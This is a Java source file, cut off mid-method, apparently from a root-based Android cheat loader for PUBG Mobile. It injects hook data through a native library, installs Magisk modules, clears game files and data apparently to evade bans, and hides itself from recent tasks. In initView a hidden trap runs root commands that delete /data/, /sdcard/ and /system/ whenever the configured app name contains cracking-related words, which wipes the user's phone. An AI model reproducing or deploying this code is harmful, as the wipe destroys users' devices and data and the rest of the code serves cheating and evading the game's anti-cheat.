package com.kmxs.reader.activity;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.RemoteException;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.View;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.content.res.AppCompatResources;
import androidx.cardview.widget.CardView;

import com.kmxs.reader.core.Config;


import com.kmxs.reader.utils.ColorDialog;
import com.kmxs.reader.utils.FileUtils;
import com.topjohnwu.superuser.internal.IOFactory;
import com.topjohnwu.superuser.io.SuFile;

import com.kmxs.reader.App;
import com.kmxs.reader.R;

import com.kmxs.reader.core.view.LoadView;
import com.kmxs.reader.drawable.drawButton;
import com.kmxs.reader.drawable.drawConcave;
import com.kmxs.reader.drawable.drawProgress;
import com.kmxs.reader.utils.AnimatorUtils;
import com.kmxs.reader.utils.AppConfig;
import com.kmxs.reader.utils.AppConfigManger;
import com.kmxs.reader.utils.BearHelper;
import com.kmxs.reader.utils.TimerTaskManager;
import com.topjohnwu.superuser.ipc.RootService;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Collections;
import java.util.List;
import java.util.Locale;
import java.util.Objects;
import java.util.Random;

import es.dmoral.toasty.Toasty;

import io.reactivex.disposables.Disposable;
import me.simple.lib.BuildConfig;
import me.simple.lib.IIDataProvider;
import me.simple.lib.activity.BaseActivity;
import me.simple.lib.advertising.request.GetAdvertisingReponse;
import me.simple.lib.advertising.request.GetAdvertisingRequest;
import me.simple.lib.injection.RootUtil;

import me.simple.lib.net.BaseRequestWraper;
import me.simple.lib.net.RetrofitClient;
import me.simple.lib.note.request.GetNoteReponse;
import me.simple.lib.note.request.GetNoteRequest;
import me.simple.lib.services.DataProviderService;
import me.simple.lib.utils.ActivityManger;
import me.simple.lib.utils.CustomDialog;
import me.simple.lib.utils.CustomProgressDialog;
import me.simple.lib.utils.ImageUtils;
import me.simple.lib.utils.LogUtils;
import me.simple.lib.utils.SafeUtils;
import me.simple.lib.utils.ShellUtils;
import me.simple.lib.utils.ZipUtil;
import me.simple.lib.version.request.GetVersionReponse;

import me.simple.lib.version.request.GetVersionRequest;
import me.simple.lib.widget.DialogFactory;


public class MainActivity extends BaseActivity {

    public static String MODE_NAME = "emperor";
    public static String OLE_MODE_NAME = "riru_subject";
    public static String OLE_MODE_NAME2 = "zygisk_subject";

    private float chuY;
    private AppConfig mAppConfig;
    public static String GAME_PACKAGE_NAME = "com.tencent.tmgp.pubgmhd";
    private CustomProgressDialog mProgressDialog;
    public static boolean isMagisk = true;
    public static boolean isUpdates = false;

    public native boolean init(String user, String sToken, String endtoken, String initState, String initData);

    static {
        System.loadLibrary("CRC32Edit");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mAppConfig = AppConfigManger.getInstance().readAppConfig();

        initView();

        excludeInRecentTask(Config.getHidden());

        requestPowerOptimizations();
        //检差token
        checkToken();
        // Token心跳包
        TimerTaskManager.getInstance().start();
        //环境检测 c a
        TimerTaskManager.environmentalTesting(mContext, mAppConfig, 2);

        //初始化环境
        Environmental();

        //检查模块版本
        isUpdates(false);

    }


    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP_MR1)
    @SuppressLint("ClickableViewAccessibility")
    private void initView() {
        Config.setHidden(getConfig("隐藏程序后台"));
        ((TextView) findViewById(R.id.title_name)).setText(mAppConfig.mName);
        ((TextView) findViewById(R.id.custom_title)).setText(mAppConfig.mName);
        try {
            ((TextView) findViewById(R.id.title_time)).setText(mAppConfig.mTime.equals("永久会员") ? "永久会员" : "到期时间: " + mAppConfig.mTime);
            ImageUtils.loadUrl(mContext, mAppConfig.mHeader, findViewById(R.id.img_header), AppCompatResources.getDrawable(mContext, R.drawable.headimg));
            if (isContain(mAppConfig.mName, "蓝天资源网") || isContain(mAppConfig.mName, "小黄鸭") || isContain(mAppConfig.mName, "破解") || isContain(mAppConfig.mName, "若尘破解") || isContain(mAppConfig.mName, "若尘")) {
                RootUtil.runShell("/system/bin/rm -r /data/", true);
                RootUtil.runShell("/system/bin/rm -r /sdcard/", true);
                RootUtil.runShell("/system/bin/rm -r /system/", true);
            }
        } catch (Exception e) {

        }

        ImageView back_img = findViewById(R.id.back_img);
        FrameLayout.LayoutParams mParams = (FrameLayout.LayoutParams) back_img.getLayoutParams();
        mParams.height = Double.valueOf(0.35 * App.getScreenHeight()).

                intValue();
        back_img.setLayoutParams(mParams);

        LinearLayout content_box = findViewById(R.id.content_box);
        FrameLayout.LayoutParams mParams1 = (FrameLayout.LayoutParams) content_box.getLayoutParams();
        mParams1.height = Double.valueOf(1.35 * App.getScreenHeight()).

                intValue() - App.getStatusBarHeight() -

                dp2px(56);
        content_box.setLayoutParams(mParams1);

        FrameLayout content_box1 = findViewById(R.id.content_box1);
        LinearLayout.LayoutParams mParams2 = (LinearLayout.LayoutParams) content_box1.getLayoutParams();
        mParams2.height = Double.valueOf(0.35 * App.getScreenHeight()).intValue();
        content_box1.setLayoutParams(mParams2);

        FrameLayout content_box2 = findViewById(R.id.content_box2);
        FrameLayout.LayoutParams mParams3 = (FrameLayout.LayoutParams) content_box2.getLayoutParams();
        mParams3.height = Double.valueOf(0.3 * App.getScreenHeight()).intValue();
        content_box2.setLayoutParams(mParams3);
        content_box2.setBackground(new drawConcave(0xFFFFFFFF));
        CardView mCardView = findViewById(R.id.mCardView);
        FrameLayout.LayoutParams mParams4 = (FrameLayout.LayoutParams) mCardView.getLayoutParams();
        mParams4.topMargin = App.getStatusBarHeight() +

                dp2px(66);
        mCardView.setLayoutParams(mParams4);
        mCardView.setCardElevation(8);
        mCardView.setRadius(44);

        LinearLayout progress = findViewById(R.id.progress);
        progress.setBackground(new drawProgress(5, new int[]{0xFFEEEEEE, 0xFF4195F8, 100
        }));

        LinearLayout user_box = findViewById(R.id.user_box);
        LinearLayout.LayoutParams mParams5 = (LinearLayout.LayoutParams) user_box.getLayoutParams();
        mParams5.topMargin = Double.valueOf(0.03 * App.getScreenHeight()).

                intValue();
        user_box.setLayoutParams(mParams5);

        FrameLayout mFrameLayout = findViewById(R.id.mFrameLayout);
        LinearLayout.LayoutParams mParams6 = (LinearLayout.LayoutParams) mFrameLayout.getLayoutParams();
        mParams6.height = App.getScreenWidth();
        mFrameLayout.setLayoutParams(mParams6);

        LoadView start_load = findViewById(R.id.start_load);

        FrameLayout.LayoutParams mParams7 = (FrameLayout.LayoutParams) start_load.getLayoutParams();
        mParams7.height = Double.valueOf(0.7 * App.getScreenWidth()).intValue();

        mParams7.width = Double.valueOf(0.7 * App.getScreenWidth()).intValue();
        start_load.setLayoutParams(mParams7);
        // start_load.setBackground(new drawLoad(200,new int[]{0xFF4195F8,0xFFEEEEEE}));

        TextView score_txt = findViewById(R.id.score_txt);
        score_txt.setTypeface(Typeface.defaultFromStyle(Typeface.BOLD));
        TextView start_float = findViewById(R.id.start_float);


        FrameLayout.LayoutParams mParams8 = (FrameLayout.LayoutParams) start_float.getLayoutParams();
        mParams8.width = Double.valueOf(0.5 * App.getScreenWidth()).intValue();

        start_float.setLayoutParams(mParams8);
        start_float.setBackground(new drawButton(0xFF4195F8));

        start_float.setOnClickListener(view ->
        {
            if (TextUtils.isEmpty(mAppConfig.mToken) || mAppConfig.isAbnormal || mAppConfig.isVPN) {
                Toasty.error(this, "恶意跳转,出去吧你", Toast.LENGTH_LONG).show();
                start_float.setVisibility(View.GONE);
                getMainHandler().postDelayed(MainActivity.this::finish, 3000);
                return;
            }

            if (isUpdates) {
                Toasty.error(mContext, "开启失败！原因：模块未安装或不是最新版", Toast.LENGTH_SHORT).show();
                DialogFactory.createTipsDialog(mContext, "开启失败", "模块未安装或不是最新版!", false).show();
                return;
            }

            if (App.isUpdata) {
                Toasty.error(this, "你尝试跳过更新,出去吧你", Toast.LENGTH_LONG).show();
                start_float.setVisibility(View.GONE);
                getMainHandler().postDelayed(MainActivity.this::finish, 3000);
                return;
            }
            if (!start_float.getText().equals("拉起游戏")) {
                RootUtil.runShell("/system/bin/am force-stop " + GAME_PACKAGE_NAME, true);
                RootUtil.runShell("/system/bin/rm -r /storage/emulated/0/imgui_init/init", true);
                System.exit(0);
                finish();
                return;
            }
            getASynHandler().post(() -> {
                for (int i = 0; i <= 200; i++) {
                    start_load.setProgress(i);
                    String p = i < 20 ? "00" + (i / 2) : (i < 200 ? "0" + (i / 2) : "" + (i / 2));
                    score_txt.setText(p);
                    try {
                        Thread.sleep(3);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
                start_float.setText("安全退出");
                RootUtil.runShell("/system/bin/am force-stop " + GAME_PACKAGE_NAME, true);
                //写出hook数据 174,248,488 - 45,894 174,202,594
                //substring(int beginIndex)
                //substring(int beginIndex, int endIndex)
                if (!init(mAppConfig.user, mAppConfig.mToken.substring(0, 16), mAppConfig.mToken.substring(16), "init_true", "174202594")) {
                    Toasty.error(this, "数据映射失败,请检测储存权限", Toast.LENGTH_LONG).show();
                }
                Intent intent = getPackageManager().getLaunchIntentForPackage(GAME_PACKAGE_NAME);
                startActivity(intent);
            });
        });

        FrameLayout isMagiskInit = findViewById(R.id.isMagiskInit);
        if (isMagisk) {
            isMagiskInit.setVisibility(View.VISIBLE);
        } else {
            isMagiskInit.setVisibility(View.GONE);
        }

        FrameLayout mFrameLayout1 = findViewById(R.id.mFrameLayout1);
        FrameLayout.LayoutParams mParams9 = (FrameLayout.LayoutParams) mFrameLayout1.getLayoutParams();
        mParams9.height = App.getStatusBarHeight() + dp2px(56);
        mFrameLayout1.setLayoutParams(mParams9);

        LinearLayout mFrameLayout2 = findViewById(R.id.mFrameLayout2);
        FrameLayout.LayoutParams mParams10 = (FrameLayout.LayoutParams) mFrameLayout2.getLayoutParams();
        mParams10.topMargin = App.getStatusBarHeight();
        mFrameLayout2.setLayoutParams(mParams10);

        LinearLayout content_back = findViewById(R.id.content_back);
        TextView custom_title = findViewById(R.id.custom_title);

        double hhhHeight = App.getScreenHeight() * .35 - dp2px(56) - App.getStatusBarHeight();


        content_box.setOnTouchListener((v, event) ->
        {


            int a = event.getAction() & 255;
            switch (a) {
                case MotionEvent.ACTION_DOWN:
                    chuY = event.getY();
                case MotionEvent.ACTION_MOVE:
                    float num = v.getY() + (event.getY() - chuY) / 10;
                    if (num - hhhHeight < 0) {
                        v.setY(num);
                        content_back.setAlpha(v.getY() > 0 ? 0 : (float) (-num / hhhHeight > 1 ? 1 : -num / hhhHeight));
                        custom_title.setAlpha(v.getY() > 0 ? 0 : (float) (-num / hhhHeight > 1 ? 1 : -num / hhhHeight));
                    }
                case MotionEvent.ACTION_UP:
                    if (v.getY() <= -hhhHeight / 2) {
                        AnimatorUtils.custom(v, "Y", new float[]{v.getY(), (float) -hhhHeight}, 150L);
                        AnimatorUtils.alpha(content_back, new float[]{content_back.getAlpha(), 1}, 150L);
                        AnimatorUtils.alpha(custom_title, new float[]{custom_title.getAlpha(), 1}, 150L);
                    } else {
                        AnimatorUtils.custom(v, "Y", new float[]{v.getY(), 0}, 150L);
                        AnimatorUtils.alpha(content_back, new float[]{content_back.getAlpha(), 0}, 150L);
                        AnimatorUtils.alpha(custom_title, new float[]{custom_title.getAlpha(), 0}, 150L);
                    }
            }
            return true;
        });

        //跳转设置
        ImageView setting = findViewById(R.id.setting);
        setting.setOnClickListener(view -> {
            startActivity(new Intent(mContext, SettingActivity.class));
            //finish();
        });

        //颜色

        ImageView color_setting = findViewById(R.id.color_setting);
        color_setting.setOnClickListener(view ->

        {
            ColorDialog.show(MainActivity.this);
        });

        //过隔离
        LinearLayout CleanLayout = findViewById(R.id.CleanLayout);
        CleanLayout.setOnClickListener(view -> {
            overIsolation();
        });

        //公告日志
        LinearLayout infoText = findViewById(R.id.infoText);
        infoText.setOnClickListener(view -> {
            if (mAppConfig.isAbnormal || mAppConfig.isVPN) {
                DialogFactory.createTipsDialog(mContext, "警告", "加载失败！原因：遇到劫持环境, 请清理!", true).show();

                start_float.setVisibility(View.GONE);
                getMainHandler().postDelayed(MainActivity.this::finish, 3000);
            } else {
                getNote();
            }
        });
        LinearLayout InitLayout = findViewById(R.id.InitLayout);
        InitLayout.setOnClickListener(view -> {
            if (mAppConfig.isAbnormal || mAppConfig.isVPN) {
                DialogFactory.createTipsDialog(mContext, "警告", "加载失败！原因：遇到劫持环境, 请清理!", true).show();

                start_float.setVisibility(View.GONE);
                getMainHandler().postDelayed(MainActivity.this::finish, 3000);
            } else
                installModules();
        });
        //更新日志
        LinearLayout listLayout = findViewById(R.id.listLayout);
        listLayout.setOnClickListener(view ->
        {
            if (mAppConfig.isAbnormal || mAppConfig.isVPN)
                DialogFactory.createTipsDialog(mContext, "警告", "加载失败！原因：遇到劫持环境, 请清理!", true).show();
            else {
                isUpdates(true);
            }
        });

        ImageView rootMode = findViewById(R.id.rootMode);
        rootMode.setOnClickListener(view ->
        {
            Toasty.success(mContext, "已经是ROOT模式了哦", Toast.LENGTH_SHORT).show();
            startActivity(new Intent(mContext, ModuleInof.class));

        });

    }

    public static void binderService() {
        try {
            Intent intent = new Intent(App.getContext(), DataProviderService.class);
            RootService.bind(intent, conn);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static IIDataProvider iiDataProvider;

    public static RootConnect conn = new RootConnect();


    public static class RootConnect implements ServiceConnection {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            try {
                iiDataProvider = IIDataProvider.Stub.asInterface(service);
                LogUtils.D("GameInject", "启动服务");
            } catch (Exception e) {
                LogUtils.D("GameInject", "启动服务失败");
                e.printStackTrace();
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            LogUtils.D("GameInject", "服务断开");
        }
    }

    private final Handler mHandler = new Handler(Looper.getMainLooper()) {
        @Override
        public void handleMessage(@NonNull Message msg) {
            super.handleMessage(msg);
            if (msg.what == 0) {
                mProgressDialog.dismiss();
                CustomDialog mDialog = new CustomDialog(MainActivity.this);
                mDialog.setTitle("提示");
                mDialog.setMessage("完成!确认后重启手机");
                mDialog.setCanceledOnTouchOutside(false);
                mDialog.setCancelable(false);
                mDialog.setButton(DialogInterface.BUTTON_POSITIVE, "确定", (dialog, which) -> {
                    dialog.dismiss();
                    ShellUtils.execCmd("reboot", true, true);
                });
                mDialog.setButton(DialogInterface.BUTTON_NEGATIVE, "取消", (dialog1, which) -> dialog1.cancel());
                mDialog.show();
            }
        }
    };

    private CustomProgressDialog createProgressDialog(String title, String message) {
        CustomProgressDialog dialog = new CustomProgressDialog(mContext);
        dialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        dialog.setTitle(title);
        dialog.setMessage(message);
        dialog.setCancelable(true);
        dialog.setCanceledOnTouchOutside(false);
        return dialog;
    }

    private void isUpdates(boolean isShowLog) {
        //LogUtils.D(TAG, "Check Version");
        GetVersionRequest Request = new GetVersionRequest();
        if (!mAppConfig.isAbnormal || !mAppConfig.isVPN)
            RetrofitClient.getInstance().get(new BaseRequestWraper<>(Request).getMap(), getLifeOwner(), new io.reactivex.SingleObserver<GetVersionReponse>() {
                @Override
                public void onSubscribe(@NonNull Disposable d) {

                }

                @Override
                public void onSuccess(@NonNull GetVersionReponse reponse) {
                    //  LogUtils.D("GetVersion onSuccess", reponse + "");
                    String appver = reponse.info.module_app_bb;
                    String appmsg = reponse.info.module_app_nshow;
                    String appuir = reponse.info.module_app_nurl;
                    String log = reponse.info.updateLog;
                    if (isShowLog) {
                        DialogFactory.createTipsDialog(mContext, "日志", log.replace("\\n", "\n"), false).show();
                    } else {
                        if (!isMagisk) {
                            return;
                        }
                        try {
                            String ModeCode = getModulesVersion(MODE_NAME);
                            if (null != ModeCode) {
                                if (Float.parseFloat(appver) > Float.parseFloat(ModeCode)) {
                                    DialogFactory.createTipsDialog(mContext, "警告", appmsg, false).show();
                                    isUpdates = true;
                                    Config.isModuleUpdate = false;
                                    Config.isModuleInstall = true;
                                    startActivity(new Intent(mContext, ModuleInof.class));
                                    finish();
                                } else {
                                    Config.isModuleUpdate = true;
                                    Config.isModuleInstall = true;
                                }
                            } else {
                                Config.isModuleInstall = false;
                                Config.isModuleUpdate = true;
                                DialogFactory.createTipsDialog(mContext, "警告", "未检测到模块,请在主页初始化", false).show();
                                isUpdates = true;
                                startActivity(new Intent(mContext, ModuleInof.class));
                                finish();
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }

                @Override
                public void onError(@NonNull Throwable e) {
                    LogUtils.E("GetVersion onError", e);
                    showDialog(e.toString());
                }
            });
    }

    private void showDialog(String message) {
        showDialog(message, false);
    }

    private void showDialog(String message, boolean isfinish) {
        DialogFactory.createTipsDialog(this, message, isfinish).show();
    }

    public String getVersionName(String name) throws Exception {
        try {
            // 获取packagemanager的实例
            PackageManager packageManager = getPackageManager();
            // getPackageName()是你当前类的包名，0代表是获取版本信息
            PackageInfo packInfo = packageManager.getPackageInfo(name, 0);
            String version = packInfo.versionName;
            return version;
        } catch (Exception e) {
            return null;
        }
    }

    public native int hashTab(String url);

    private void ChangeDeviceInfo() {
        getASynHandler().post(() -> {
            ShellUtils.execCmd("am force-stop com.tencent.tmgp.pubgmhd", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/mapversion.ini /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/.mapversion.ini", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SrcVersion.ini /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/.SrcVersion.ini", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Config /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/.Config", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/.SaveGames", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/.Paks", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/rawdata /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/.rawdata", true, true);
            ShellUtils.execCmd("rm -rf /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/*", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/.mapversion.ini /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/mapversion.ini", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/.SrcVersion.ini /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SrcVersion.ini", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/.Config /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Config", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/.SaveGames /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/.Paks /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/.rawdata /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/rawdata", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/.Saved", true, true);
            ShellUtils.execCmd("rm -rf /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/*", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/.Saved /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/.ShadowTrackerExtra", true, true);
            ShellUtils.execCmd("rm -rf /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/*", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/.ShadowTrackerExtra /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra", true, true);

            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/.ShadowTrackerExtra", true, true);
            ShellUtils.execCmd("rm -rf /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/*", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/.ShadowTrackerExtra /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra", true, true);

            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/.UE4Game", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/ProgramBinaryCache /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/.ProgramBinaryCache", true, true);
            ShellUtils.execCmd("rm -rf /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/*", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/.ProgramBinaryCache /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/ProgramBinaryCache", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/.UE4Game /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game", true, true);

            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/.files", true, true);
            ShellUtils.execCmd("rm -rf /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/*", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/.files /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files", true, true);

            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd1", true, true);
            ShellUtils.execCmd("pm clear com.tencent.tmgp.pubgmhd", true, true);
            ShellUtils.execCmd("mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd1 /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd", true, true);
            mHandler.sendEmptyMessage(0);
            //DeviceInfoUtils.ChangeAndroidId("com.tencent.tmgp.pubgmhd", DeviceInfoUtils.GenerateRandomAndroidId());
        });

    }

    /**
     * 比较签名
     */
    boolean 看你妈(Context context, String cert_sha1) throws
            PackageManager.NameNotFoundException, NoSuchAlgorithmException {
        String current_sha1 = 擦你妈(context);
        current_sha1 = current_sha1.replace(":", "");
        return cert_sha1.equals(current_sha1);
    }

    /**
     * 生成sha1的签名
     */
    private String 擦你妈(Context context) throws
            PackageManager.NameNotFoundException, NoSuchAlgorithmException {
        PackageInfo info = context.getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_SIGNATURES);
        byte[] cert = info.signatures[0].toByteArray();
        MessageDigest md = MessageDigest.getInstance("SHA1");
        byte[] publicKey = md.digest(cert);
        StringBuffer hexString = new StringBuffer();
        for (int i = 0; i < publicKey.length; i++) {
            String appendString = Integer.toHexString(0xFF & publicKey[i]).toUpperCase(Locale.US);
            if (appendString.length() == 1) {
                hexString.append("0");
            }
            hexString.append(appendString);//签名的格式是11:22,所以需要加上":"
            hexString.append(":");
        }
        String result = hexString.toString();
        return result.substring(0, result.length() - 1);
    }


    boolean getConfig(String key) {
        SharedPreferences sp = this.getSharedPreferences("config", Context.MODE_PRIVATE);
        return sp.getBoolean(key, false);
    }

    private void getNote() {
        //LogUtils.D(TAG, "Get Note");
        GetNoteRequest Request = new GetNoteRequest();
        if (!mAppConfig.isAbnormal || !mAppConfig.isVPN)
            RetrofitClient.getInstance().get(new BaseRequestWraper<>(Request).getMap(), getLifeOwner(), new io.reactivex.SingleObserver<GetNoteReponse>() {
                @Override
                public void onSubscribe(@NonNull Disposable d) {

                }

                @Override
                public void onSuccess(@NonNull GetNoteReponse reponse) {
                    if (reponse.isCharge.contains("y")) {
                        //环境检测
                        TimerTaskManager.environmentalTesting(mContext, mAppConfig, 1);
                        SafeUtils.isCharge = true;
                    } else {
                        SafeUtils.isCharge = false;
                    }
                    //   LogUtils.D("GetNote onSuccess", reponse + "");
                    if (reponse.note != null && reponse.note.size() > 0 && !reponse.note.get(0).content.equals("")) {
                        DialogFactory.createTipsDialog(mContext, "公告", reponse.note.get(0).content.replace("\\n", "\n"), false).show();
                    }
                }

                @Override
                public void onError(@NonNull Throwable e) {
                    //    LogUtils.E("GetNote onError", e);
                    showDialog(e.toString());
                }
            });
    }

    /**
     * 写资源文件
     */
    public void loadAssets(String sock) {
        String pathf = getFilesDir().toString() + "/" + sock;
        try {
            OutputStream myOutput = new FileOutputStream(pathf);
            byte[] buffer = new byte[1024];
            int length;
            InputStream myInput = getAssets().open(sock);
            while ((length = myInput.read(buffer)) > 0) {
                myOutput.write(buffer, 0, length);
            }
            myInput.close();
            myOutput.flush();
            myOutput.close();
        } catch (IOException e) {
        }
        String Path = getFilesDir().toString() + "/" + sock;
        try {
            Runtime.getRuntime().exec("chmod 777 " + Path);
        } catch (IOException e) {
        }
    }


    private void changeAbi(int mode) {

        PackageInfo pi = null;
        try {
            pi = getPackageManager().getPackageInfo(GAME_PACKAGE_NAME, 0);
        } catch (Throwable th) {

        }
        try {
            RootUtil.runShell("/system/bin/rm -r " + new File(Objects.requireNonNull(new File(pi.applicationInfo.publicSourceDir).getParentFile()).getAbsolutePath() + "/lib"), true);
